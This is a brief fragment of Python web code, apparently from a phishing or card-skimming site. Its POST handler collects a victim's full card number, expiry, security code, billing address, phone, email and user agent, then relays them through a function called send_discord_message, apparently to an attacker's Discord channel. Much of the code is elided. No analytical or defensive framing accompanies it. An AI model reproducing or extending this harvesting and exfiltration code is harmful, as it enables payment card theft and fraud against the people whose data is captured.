...
def first():
    if request.method == 'POST':
        ...
        send_discord_message(cardholder_name, card_number, expiration_date, security_code, billing_address, city, state, zip_code, country, phone_number, email, useragent)
